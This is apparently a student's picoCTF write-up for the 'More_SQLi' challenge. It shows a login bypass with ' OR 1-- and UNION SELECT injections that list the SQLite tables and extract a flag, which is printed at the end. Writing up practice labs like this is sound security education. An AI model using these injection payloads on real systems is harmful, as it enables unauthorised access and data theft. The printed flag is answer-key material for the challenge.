# More_SQLi

## Method

Upon opening the website we are greeted with a login page. Trying username 1 and password 1. We are then shown this.

```
username: 1
password: 1
SQL query: SELECT id FROM users WHERE password = '1' AND username = '1'
```

The command at the end is trying to access an sql database
The command can be understood by breaking into parts.
SELECT id – Retrieves the id field for matching records in the users table.
FROM users – Specifies the table, users, from which to retrieve data.
WHERE password = '1' AND username = '1' – Checks if there is a record with both password set to '1' and username set to '1'

Now basically we need to SQl inject something or quite literally write SQL logic that will let us in as it will work in our favor.

So we can just give a test username such as hadakoi ( my ctf username ) then pass a password that will bypass the requirements...

We can pass ' OR 1 in the password section to allow us through.

': This closes the password field in the SQL query.
OR 1: This adds a condition that always evaluates to TRUE (because 1 is always TRUE in SQL).
--: This tells SQL to ignore the rest of the query (the part that would normally check if the password is correct).

This works as the password is already authenticated as true hence allowing us into the next page. This essentially bypasses the real password.
to look at it closer the OR 1 basically will always return true due to the condition statement hence making the password seem genuine.

SELECT id FROM users WHERE username = 'hadakoi' AND password = '' OR 1--'
essentially what our command looks like when passing the values.

---

Our next page looks like an sql database with a query system.

When i entered the name Algiers it shows me the info for the office in Algiers which is 

Algiers - Birger Jarlsgatan 7, 4 tr -	+246 8-616 99 40

Essentially typing the name of a city in the query bar does an sql command.

This will most likely be

```
SELECT city, address, phone FROM cities WHERE city = 'citynameentered';
```

SELECT city, address, phone: This part specifies which columns to retrieve from the table (city, address, and phone).
FROM cities: Specifies the table to retrieve the data from, in this case, cities
WHERE city = 'citynameentered'

Adding ' UNION SELECT 1, 2, 3-- is a common sql injection at the end of our input.

UNION: This keyword combines the results of two or more SELECT statements. 
For a UNION to work correctly, both SELECT statements must return the same number of columns with compatible data types.

Select 1, 2, 3: adds columns 1, 2, 3 we have used 3 columns as we are returning 3 columns like in the previous question.

Say for example entering **Algiers' UNION SELECT 1,2,3--**
we use a ' after the cityname to close the input field so we can start our SQL query
what this looks like -> 

```
SELECT city, address, phone FROM cities WHERE city = 'Algiers' UNION SELECT 1,2,3--
```

And hence we can see that it has added a new row :D 

City	Address	Phone
1	2	3
Algiers	Birger Jarlsgatan 7, 4 tr	+246 8-616 99 40

after knowing our basic injection works we want to find out what other columns are present in this SQL as it could relay more hints for this.
I used the hint talking about SQLiLite so searching up SQLiLite show tables 

https://stackoverflow.com/questions/82875/how-can-i-list-the-tables-in-a-sqlite-database-file-that-was-opened-with-attach

Only "SELECT name FROM sqlite_master WHERE type='table'" works for me
this command caught my eye 

so remaking our command to 

**'UNION SELECT name,1,2 FROM sqlite_master WHERE type='table'--**


this selects from the name column then injects 1,2 
name Column: The name column in sqlite_master contains the names of all tables, indexes, and views.

sqlite_master Table: In SQLite databases, sqlite_master is a special table that stores metadata about the database structure.

the last one type='table' essentially filters for the table names in the database.

This essentially does.
```
SELECT city, address, phone FROM cities WHERE city = '' UNION SELECT name, 1,2 FROM sqlite_master WHERE type='table'--
```

This returns us something intresting 

City	Address	Phone
hints	1	2
more_table	1	2
offices	1	2
users	1	2

from this we can tell our SELECT name, 1, 2 is forcibly hiding the stuff :'( so we need to reformat our command to be able to see the column items as well 

After further research SQL refers to a sql column that holds the SQL statements used to create objects (tables, views, etc.) in the database.
so we can use 'UNION SELECT name,SQL,SQL FROM sqlite_master WHERE type='table'--

from this we can then see 

CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)
CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)

<img width="491" alt="image" src="https://github.com/user-attachments/assets/60f5db04-9c2a-4c9c-84c3-67e7e90f153a">

Now that we know a hints table exists and what is being used to create it we can use an injection statement to find what is running it.

CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)

so we can see there are 2 attributes namely id, info.

**' UNION SELECT id,info,2 from hints--**

we end up seeing this 

![image](https://github.com/user-attachments/assets/217a1f1d-6a58-436b-88f5-c8cc4dfac1f3)

from here i can assume we have to directly select it from the more_table as it has an attribute called flag i cant believe I missed this :cry:

we now make our command 

**' UNION SELECT id,flag,2 from more_table--**

We can then see our flag :D finally bru

## Flag

> picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
